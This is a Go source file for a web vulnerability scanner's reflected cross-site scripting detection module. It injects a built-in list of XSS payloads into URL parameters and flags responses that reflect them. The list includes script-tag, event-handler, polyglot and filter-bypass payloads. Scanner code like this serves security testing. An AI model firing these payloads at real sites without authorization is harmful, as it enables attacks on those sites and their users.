package modules

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/RowanDark/0xgen/internal/atlas"
)

// XSSModule detects cross-site scripting vulnerabilities.
type XSSModule struct {
	*atlas.BaseModule
	payloads []string
}

// NewXSSModule creates a new XSS detection module.
func NewXSSModule(logger atlas.Logger, oastClient atlas.OASTClient) *XSSModule {
	base := atlas.NewBaseModule(
		"xss",
		"Cross-Site Scripting Detection",
		"injection",
		atlas.SeverityHigh,
		logger,
		oastClient,
	)

	return &XSSModule{
		BaseModule: base,
		payloads:   defaultXSSPayloads,
	}
}

var defaultXSSPayloads = []string{
	// Basic
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",

	// Event handlers
	"\" onload=alert(1)>",
	"' onload=alert(1)>",
	"<body onload=alert(1)>",
	"<input onfocus=alert(1) autofocus>",

	// Polyglots
	"javascript:alert(1)",
	"';alert(1);//",
	"\"><script>alert(1)</script>",

	// Filter bypasses
	"<scr<script>ipt>alert(1)</scr</script>ipt>",
	"<ScRiPt>alert(1)</ScRiPt>",
	"<img src=x onerror=&#97;lert(1)>",

	// Context-specific
	"'-alert(1)-'",
	"\"-alert(1)-\"",
	"</script><script>alert(1)</script>",
}

// SupportsTarget checks if this module can scan the target.
func (m *XSSModule) SupportsTarget(target *atlas.ScanTarget) bool {
	return true // XSS can affect any endpoint
}

// Scan performs XSS detection on the target.
func (m *XSSModule) Scan(ctx context.Context, target *atlas.ScanTarget) ([]*atlas.Finding, error) {
	var findings []*atlas.Finding

	params := m.extractParameters(target)
	if len(params) == 0 {
		return findings, nil
	}

	for paramName := range params {
		// Check context cancellation
		select {
		case <-ctx.Done():
			return findings, ctx.Err()
		default:
		}

		// Test reflected XSS
		if finding := m.testReflected(ctx, target, paramName); finding != nil {
			findings = append(findings, finding)
		}
	}

	return findings, nil
}

func (m *XSSModule) testReflected(ctx context.Context, target *atlas.ScanTarget, param string) *atlas.Finding {
	// Use unique marker to detect reflection
	marker := fmt.Sprintf("xss%d", time.Now().UnixNano())

	for _, payload := range m.payloads {
		// Inject payload with marker
		testPayload := strings.ReplaceAll(payload, "alert(1)", fmt.Sprintf("alert('%s')", marker))

		resp, err := m.sendTestRequest(ctx, target, param, testPayload)
		if err != nil {
			continue
		}

		body, err := m.ReadBody(resp)
		if err != nil {
			continue
		}

		// Check if payload reflected in response
		if strings.Contains(body, testPayload) || strings.Contains(body, marker) {
			// Check context (HTML, JS, attribute, etc.)
			context := m.detectContext(body, marker, testPayload)

			return m.CreateFinding(target, "Cross-Site Scripting (Reflected)", atlas.ConfidenceConfirmed, atlas.Evidence{
				Parameter: param,
				Location:  m.getParamLocation(target, param),
				Request:   atlas.FormatRequest(resp.Request),
				Response:  atlas.TruncateBody(body, 1000),
				Payload:   testPayload,
				Proof:     fmt.Sprintf("Payload reflected in %s context", context),
			})
		}
	}

	return nil
}

func (m *XSSModule) detectContext(body, marker, payload string) string {
	// Try to detect the context where the payload appears
	markerIdx := strings.Index(body, marker)
	payloadIdx := strings.Index(body, payload)

	idx := markerIdx
	if idx == -1 {
		idx = payloadIdx
	}
	if idx == -1 {
		return "unknown"
	}

	// Look backwards for context clues
	start := maxInt(0, idx-100)
	before := body[start:idx]

	// Check for script context
	if strings.Contains(before, "<script") {
		return "JavaScript"
	}

	// Check for attribute context
	if strings.Contains(before, "=\"") || strings.Contains(before, "='") {
		return "HTML attribute"
	}

	// Check for HTML context
	if strings.Contains(before, "<") && strings.Contains(before, ">") {
		return "HTML"
	}

	// Check if inside a tag
	lastOpen := strings.LastIndex(before, "<")
	lastClose := strings.LastIndex(before, ">")
	if lastOpen > lastClose {
		return "HTML tag"
	}

	return "text"
}

func (m *XSSModule) sendTestRequest(ctx context.Context, target *atlas.ScanTarget, param, payload string) (*http.Response, error) {
	// Clone target URL
	u, err := url.Parse(target.URL)
	if err != nil {
		return nil, err
	}

	// Inject payload into parameter
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	// Create request
	req, err := http.NewRequestWithContext(ctx, target.Method, u.String(), nil)
	if err != nil {
		return nil, err
	}

	// Add custom headers
	for k, v := range target.Headers {
		req.Header.Set(k, v)
	}

	return m.SendRequest(ctx, req)
}

func (m *XSSModule) extractParameters(target *atlas.ScanTarget) map[string]string {
	params := make(map[string]string)

	// From target.Parameters
	for k, v := range target.Parameters {
		params[k] = v
	}

	// From URL query string
	if u, err := url.Parse(target.URL); err == nil {
		for k, v := range u.Query() {
			if len(v) > 0 {
				params[k] = v[0]
			}
		}
	}

	return params
}

func (m *XSSModule) getParamLocation(target *atlas.ScanTarget, param string) atlas.ParamLocation {
	if strings.Contains(target.URL, "?"+param+"=") || strings.Contains(target.URL, "&"+param+"=") {
		return atlas.ParamLocationQuery
	}
	if target.Method == "POST" {
		return atlas.ParamLocationBody
	}
	return atlas.ParamLocationQuery
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}
